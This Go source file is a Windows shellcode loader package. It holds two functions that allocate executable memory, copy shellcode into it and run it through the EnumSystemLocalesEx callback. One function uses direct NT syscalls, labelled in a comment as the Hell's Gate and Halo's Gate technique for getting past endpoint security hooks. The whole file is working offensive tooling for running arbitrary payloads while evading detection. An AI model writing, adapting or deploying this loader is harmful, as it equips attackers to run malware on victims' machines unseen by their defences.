package loader

import (
	"fmt"
	"unsafe"
	"variant/xwindows"

	"golang.org/x/sys/windows"
)

func EnumSystemLocalesExX(shellcode []byte) error {
	addr, vaErr := xwindows.VirtualAlloc(
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 {
		return fmt.Errorf("VirtualAlloc failed: %w", vaErr)
	}

	rmErr := xwindows.RtlMoveMemory(
		unsafe.Pointer(addr),
		unsafe.Pointer(&shellcode[0]),
		uintptr(len(shellcode)),
	)
	if rmErr != nil {
		return fmt.Errorf("RtlMoveMemory failed: %w", rmErr)
	}

	_, enumErr := xwindows.EnumSystemLocalesEx(
		addr,
		0,
		0,
		0,
	)
	if enumErr != nil {
		return fmt.Errorf("EnumSystemLocalesEx failed: %w", enumErr)
	}

	return nil
}

/*
EnumSystemLocalesHalos
Hell's Gate + Halo's Gate technique
*/
func EnumSystemLocalesHalos(shellcode []byte) error {
	pHandle, gcpErr := xwindows.GetCurrentProcess()
	if gcpErr != nil {
		return fmt.Errorf("GetCurrentProcess failed: %w", gcpErr)
	}

	var addr uintptr
	regionsize := uintptr(len(shellcode))

	r1, ntAllocErr := xwindows.NtAllocateVirtualMemory(
		pHandle,
		(*byte)(unsafe.Pointer(&addr)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)
	if r1 != 0 {
		return fmt.Errorf("NtAllocateVirtualMemory failed: %w", ntAllocErr)
	}

	var numberOfBytesWritten uintptr
	r2, ntWriteErr := xwindows.NtWriteVirtualMemory(
		pHandle,
		(*byte)(unsafe.Pointer(addr)),
		&shellcode[0],
		uintptr(len(shellcode)),
		&numberOfBytesWritten,
	)
	if r2 != 0 {
		return fmt.Errorf("NtWriteVirtualMemory failed: %w", ntWriteErr)
	}

	_, enumSystemErr := xwindows.EnumSystemLocalesEx(
		addr,
		0,
		0,
		0,
	)
	if enumSystemErr != nil {
		return fmt.Errorf("EnumSystemLocalesEx failed: %w", enumSystemErr)
	}

	return nil
}
